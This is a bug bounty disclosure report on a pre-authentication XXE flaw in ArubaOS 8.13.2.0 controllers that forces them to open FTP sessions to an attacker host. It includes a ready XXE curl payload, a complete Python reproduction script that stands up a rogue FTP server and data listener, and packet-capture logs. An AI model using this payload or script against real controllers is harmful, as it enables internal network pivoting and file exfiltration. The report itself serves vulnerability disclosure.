# Pre-Authentication XXE → FTP SSRF with Active File Retrieval (RETR) — ArubaOS 8.13.2.0

**Researcher:** Vesqer / JM00NJ  
**Date:** 2026-05-07  
**Target:** HPE Aruba Networking Wireless — AOS-8 Controllers  
**VRT:** Server-Side Request Forgery > FTP SSRF / XML External Entity Injection  
**Suggested Priority:** P1  
**CVSS v3.1 Score:** 9.3 — Critical  
**Related Submission:** `9e946ca3-c69e-4cec-bc88-657aa34d3665` (Pre-auth XXE HTTP SSRF)

---

## Summary

A pre-authentication XML External Entity (XXE) injection vulnerability on port `32000/TCP` of ArubaOS 8.13.2.0 LSR allows an unauthenticated attacker to force the controller to initiate a **complete FTP session** to attacker-controlled infrastructure. The full attack chain was confirmed live and via packet capture:

- Anonymous credential disclosure (`USER anonymous` / `PASS anonymous@`)
- Passive mode negotiation (`PASV`) with attacker-supplied data port
- Binary transfer mode (`TYPE I`)
- Active file retrieval (`RETR /test.txt`) over an independent data channel

**Three distinct TCP connections** were established from the controller to the attacker machine during a single exploitation attempt. No authentication, session token, or credentials of any kind are required.

---

## Affected Component

| Field | Value |
|---|---|
| Product | HPE Aruba Networking Wireless — AOS-8 Controller |
| Version | ArubaOS 8.13.2.0 LSR (Build 95415, compiled 2026-03-25) |
| Model | ArubaMC-VA-US |
| Vulnerable Endpoint | `http://<device-ip>:32000/` |
| Protocol | HTTP (plaintext, no TLS) |
| Authentication Required | None |

---

## Vulnerability Details

The XML parser on port `32000` resolves `ftp://` scheme external entity references without any authentication check. When a crafted XML document containing an `ftp://` URI is submitted, the controller initiates a full RFC 959 compliant FTP session to the specified host. The controller's built-in FTP client implements the complete protocol stack:

1. Connects to attacker-specified host and port (TCP SYN)
2. Sends `USER anonymous`
3. Sends `PASS anonymous@`
4. Sends `PASV` — and correctly parses the `227` response to extract the data channel IP and port
5. Opens a **second TCP connection** to the attacker-specified data port
6. Sends `TYPE I` (binary mode)
7. Sends `RETR <filename>` — actively requesting file transfer
8. Sends `QUIT` on completion

This behavior is distinct from the previously submitted HTTP SSRF (submission `9e946ca3`) in both protocol behavior and impact surface. The `ftp://` scheme enables dual-channel exploitation — control channel plus an independent inbound data connection — which can bypass network controls that permit FTP control traffic while blocking HTTP.

---

## Steps to Reproduce

### Prerequisites

- Attacker machine with two open TCP ports: `9993` (FTP control) and `9980` (PASV data)
- Network access to `http://<target>:32000/`
- Python 3 (no external dependencies)

### Step 1 — Start the FTP interception server

```bash
sudo python3 xxe_ftp_pasv.py
```

The script opens both listeners, sends the XXE payload automatically, and logs the complete FTP dialog.

### Step 2 — Manual curl reproduction (optional)

```bash
# Start nc listener on control port first
nc -lvp 9993

# Send payload
curl -s -i -X POST "http://<target-ip>:32000/" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://192.168.56.102:9993/test.txt">]>
<aruba><opcode>&xxe;</opcode></aruba>'
```

### Step 3 — Observed FTP dialog

Confirmed output from reproduction script and corroborated byte-for-byte in `ftpxxep1.pcapng`:

```
ATTACKER   <-  220 FTP Server Ready
CONTROLLER ->  USER anonymous
ATTACKER   <-  331 Password required
CONTROLLER ->  PASS anonymous@
ATTACKER   <-  230 Login successful
CONTROLLER ->  PASV
ATTACKER   <-  227 Entering Passive Mode (192,168,56,102,38,252)
[DATA]          SYN 192.168.56.50:56328 -> :9980   ← DATA CHANNEL OPENED
CONTROLLER ->  TYPE I
ATTACKER   <-  200 Type set to I
CONTROLLER ->  RETR /test.txt                       ← FILE RETRIEVAL REQUESTED
ATTACKER   <-  150 Opening BINARY mode data connection
ATTACKER   <-  226 Transfer complete
[DATA]          FIN :9980                           ← DATA CHANNEL CLOSED
CONTROLLER ->  QUIT
ATTACKER   <-  221 Goodbye
```

### Step 4 — Packet capture evidence

Three independent TCP connections confirmed in `ftpxxep1.pcapng`:

| # | Source | Destination | Purpose |
|---|---|---|---|
| 1 | 192.168.56.102:55630 | 192.168.56.50:32000 | XXE trigger (attacker → target) |
| 2 | 192.168.56.50:37146 | 192.168.56.102:9993 | FTP control channel (target → attacker) |
| 3 | 192.168.56.50:56328 | 192.168.56.102:9980 | FTP data channel PASV (target → attacker) |

Full FTP timeline from pcap (hex-decoded):

| Timestamp | Direction | Data |
|---|---|---|
| t=0.019 | Attacker → | `220 FTP Server Ready` |
| t=0.020 | Controller → | `USER anonymous` |
| t=0.020 | Attacker → | `331 Password required` |
| t=0.022 | Controller → | `PASS anonymous@` |
| t=0.022 | Attacker → | `230 Login successful` |
| t=0.024 | Controller → | `PASV` |
| t=0.024 | Attacker → | `227 Entering Passive Mode (192,168,56,102,38,252)` |
| t=0.026 | **DATA** | **SYN from 192.168.56.50:56328 → :9980** |
| t=0.027 | Controller → | `TYPE I` |
| t=0.556 | Attacker → | `200 Type set to I` |
| t=0.558 | Controller → | **`RETR /test.txt`** |
| t=0.558 | Attacker → | `150 Opening BINARY mode data connection` |
| t=3.559 | Attacker → | `226 Transfer complete` |
| t=5.031 | **DATA** | **FIN :9980 — data channel closed** |
| t=5.032 | Controller → | `QUIT` |
| t=5.032 | Attacker → | `221 Goodbye` |

---

## Impact

### Credential Disclosure
The controller transmits `USER anonymous` and `PASS anonymous@` in plaintext to any attacker-specified FTP host. In a real environment where internal FTP servers exist, these credentials are sent directly to those servers — potentially granting access if anonymous login is permitted.

### Active File Retrieval via RETR
`RETR /test.txt` confirms the controller is not merely probing — it actively requests file transfer. Redirecting the `ftp://` URI to an internal FTP server causes the controller to exfiltrate files from that server to the attacker over the data channel. The attacker controls both the target path (`/test.txt`) and the data destination (PASV port).

### Internal Network Pivot
The controller acts as an unwilling FTP client against any FTP-capable host reachable from its network position. Internal management systems, file servers, and infrastructure not externally accessible can be reached through this vector.

### Dual-Channel Firewall Bypass
Unlike HTTP SSRF (single TCP connection), FTP SSRF establishes two connections — control and data. Network controls permitting outbound FTP (port 21) may not account for the inbound data channel, allowing the attack to bypass stateless firewall rules.

### Pre-Authentication Attack Surface
No credentials of any kind are required. Any network-adjacent attacker with access to port 32000 can trigger the complete chain with a single HTTP POST request.

---

## CVSS v3.1

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`

| Metric | Value | Rationale |
|---|---|---|
| Attack Vector | Network | Port 32000 reachable over network |
| Attack Complexity | Low | Single HTTP POST, no preconditions |
| Privileges Required | None | Pre-authentication |
| User Interaction | None | Fully server-side |
| Scope | Changed | Controller impacts internal FTP servers beyond its own security boundary |
| Confidentiality | High | File content exfiltration via RETR |
| Integrity | Low | STOR command may be possible (not yet tested) |
| Availability | None | No crash observed |

**Base Score: 9.3 — Critical**

---

## Relation to Previously Submitted Finding

This submission extends the pre-authentication XXE vulnerability documented in submission `9e946ca3`. That report demonstrated `http://` scheme SSRF. This report demonstrates that the same endpoint resolves `ftp://` scheme, enabling a materially different and more impactful attack chain. These are submitted as independent findings due to:

- Distinct protocol behavior (RFC 959 vs HTTP)
- Independent exploitability (neither requires the other)
- Different impact surface (dual-channel, credential disclosure, active file retrieval)
- Separate CVSS vectors

---

## Attachments

| File | Description |
|---|---|
| `ftpxxep1.pcapng` | Full packet capture — 3 TCP connections, complete FTP dialog, hex-verified |
| `xxe_ftp_pasv.py` | Reproduction script — FTP server + data listener + XXE trigger |

---

## Reproduction Script

```python
#!/usr/bin/env python3
"""
XXE FTP PASV Tester — ArubaOS vGW Authorized Research
Author: Vesqer / JM00NJ

Goal:
  1. Trigger XXE with ftp:// URI
  2. Complete full FTP dialog including PASV response
  3. Open data listener — capture if controller initiates data connection
  4. Log everything for bug report evidence
"""

import socket
import threading
import subprocess
import time
import os

# ─── CONFIG ───────────────────────────────────────────────────────────────────
TARGET_IP    = "192.168.56.50"
TARGET_PORT  = 32000
ATTACKER_IP  = "192.168.56.102"
FTP_PORT     = 9993   # control channel
DATA_PORT    = 9980   # PASV data channel (attacker listens here)
# ──────────────────────────────────────────────────────────────────────────────

def pasv_format(ip, port):
    ip_parts = ip.replace(".", ",")
    p1 = port >> 8
    p2 = port & 0xFF
    return f"227 Entering Passive Mode ({ip_parts},{p1},{p2})\r\n"

PASV_RESPONSE = pasv_format(ATTACKER_IP, DATA_PORT)

data_result = {"status": "[-] No data connection", "data": b""}

def data_listener(port, timeout=15):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        s.settimeout(timeout)
        print(f"  [DATA] Listening on :{port} for incoming data connection...")
        conn, addr = s.accept()
        conn.settimeout(5)
        chunks = []
        while True:
            try:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            except socket.timeout:
                break
        conn.close()
        raw = b"".join(chunks)
        if raw:
            data_result["status"] = f"[+] DATA CONNECTION from {addr[0]} — {len(raw)} bytes received"
            data_result["data"]   = raw
        else:
            data_result["status"] = f"[+] DATA CONNECTION from {addr[0]} — connected but no data"
    except socket.timeout:
        data_result["status"] = "[-] No data connection (timeout)"
    except Exception as e:
        data_result["status"] = f"[!] Data listener error: {e}"
    finally:
        s.close()

ftp_log  = []
ftp_done = threading.Event()

def ftp_control_server(port, timeout=15):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        s.settimeout(timeout)
        conn, addr = s.accept()
        conn.settimeout(5)
        ftp_log.append(f"[CONNECT] {addr[0]}:{addr[1]}")

        def send(msg):
            conn.send(msg.encode())
            ftp_log.append(f"SENT:  {msg.strip()}")

        def recv():
            try:
                data = conn.recv(1024).decode(errors="replace").strip()
                ftp_log.append(f"RECV:  {data}")
                return data
            except socket.timeout:
                ftp_log.append("RECV:  <timeout>")
                return ""

        send("220 FTP Server Ready\r\n")

        cmd = recv()
        if cmd.upper().startswith("USER"):
            send("331 Password required\r\n")
        else:
            send("331 Password required\r\n")

        cmd = recv()
        if cmd.upper().startswith("PASS"):
            send("230 Login successful\r\n")
        else:
            send("230 Login successful\r\n")

        for _ in range(10):
            cmd = recv()
            if not cmd:
                break

            if cmd.upper().startswith("PASV"):
                ftp_log.append(f"[PASV] Responding with data port {DATA_PORT}")
                send(PASV_RESPONSE)
                time.sleep(0.5)

                for _ in range(8):
                    cmd2 = recv()
                    if not cmd2:
                        break
                    if cmd2.upper().startswith("TYPE"):
                        send("200 Type set to I\r\n")
                    elif cmd2.upper().startswith("SIZE"):
                        send("213 1024\r\n")
                    elif cmd2.upper().startswith("MDTM"):
                        send("213 20260101000000\r\n")
                    elif cmd2.upper().startswith("RETR"):
                        filename = cmd2[5:].strip() if len(cmd2) > 5 else "unknown"
                        ftp_log.append(f"[!!!] RETR REQUESTED: {filename}")
                        send("150 Opening BINARY mode data connection\r\n")
                        time.sleep(3)
                        send("226 Transfer complete\r\n")
                        break
                    elif cmd2.upper().startswith("LIST"):
                        ftp_log.append("[!!!] LIST REQUESTED — directory listing attempt")
                        send("150 Opening ASCII mode data connection\r\n")
                        time.sleep(3)
                        send("226 Transfer complete\r\n")
                        break
                    elif cmd2.upper().startswith("QUIT"):
                        send("221 Goodbye\r\n")
                        break
                    else:
                        send("500 Unknown command\r\n")

            elif cmd.upper().startswith("TYPE"):
                send("200 Type set to I\r\n")
            elif cmd.upper().startswith("SIZE"):
                send("213 1024\r\n")
            elif cmd.upper().startswith("QUIT"):
                send("221 Goodbye\r\n")
                break
            else:
                send("500 Unknown command\r\n")

        conn.close()
    except socket.timeout:
        ftp_log.append("[TIMEOUT] No connection")
    except Exception as e:
        ftp_log.append(f"[ERROR] {e}")
    finally:
        s.close()
        ftp_done.set()

def build_ftp_payload(attacker_ip, port):
    uri = f"ftp://{attacker_ip}:{port}/test.txt"
    return (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{uri}">]>\n'
        '<aruba><opcode>&xxe;</opcode></aruba>'
    )

def send_payload(xml_payload, timeout=12):
    cmd = [
        "curl", "-s", "-i", "-X", "POST",
        f"http://{TARGET_IP}:{TARGET_PORT}/",
        "-H", "Content-Type: text/xml",
        "--max-time", str(timeout),
        "-d", xml_payload,
    ]
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 2)
        return out.stdout
    except Exception as e:
        return f"curl error: {e}"

def main():
    print(f"\n{'='*60}")
    print(f"  XXE FTP PASV Tester | Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"  FTP control: :{FTP_PORT}  |  PASV data: :{DATA_PORT}")
    print(f"  PASV response: {PASV_RESPONSE.strip()}")
    print(f"{'='*60}\n")

    dt = threading.Thread(target=data_listener, args=(DATA_PORT, 20), daemon=True)
    dt.start()
    time.sleep(0.3)

    ft = threading.Thread(target=ftp_control_server, args=(FTP_PORT, 15), daemon=True)
    ft.start()
    time.sleep(0.4)

    print(f"[*] Sending XXE payload with ftp://{ATTACKER_IP}:{FTP_PORT}/test.txt\n")
    send_payload(build_ftp_payload(ATTACKER_IP, FTP_PORT))

    ftp_done.wait(timeout=18)
    dt.join(timeout=22)

    print("[*] FTP Control Channel Dialog:")
    print(f"    {'-'*50}")
    for line in ftp_log:
        print(f"    {line}")
    print(f"    {'-'*50}\n")

    print("[*] FTP Data Channel (PASV):")
    print(f"    {data_result['status']}")
    if data_result["data"]:
        print(f"    Raw data ({len(data_result['data'])} bytes):")
        print(f"    {data_result['data'].decode(errors='replace')[:500]}")
    print()

    print(f"{'='*60}")
    print("  SUMMARY")
    print(f"{'='*60}")
    creds = [l for l in ftp_log if "USER" in l or "PASS" in l]
    pasv  = [l for l in ftp_log if "PASV" in l]
    retr  = [l for l in ftp_log if "RETR" in l or "LIST" in l]
    print(f"  Credentials disclosed : {', '.join(creds) if creds else 'none'}")
    print(f"  PASV triggered        : {'YES' if pasv else 'NO'}")
    print(f"  File retrieval cmd    : {', '.join(retr) if retr else 'none'}")
    print(f"  Data connection       : {data_result['status'].split('|')[0].strip()}")
    if data_result["data"]:
        print("\n  [!!!] DATA RECEIVED — controller exfiltrated content via FTP")
    elif pasv:
        print("\n  [!] PASV triggered — controller attempted data connection")
        print("      → Evidence of active file retrieval attempt via FTP SSRF")
    print()

if __name__ == "__main__":
    main()
```

---

*This report is submitted under the HPE Aruba Networking Bug Bounty Program on Bugcrowd. All testing was performed in an isolated lab environment on authorized hardware. No production systems were accessed.*
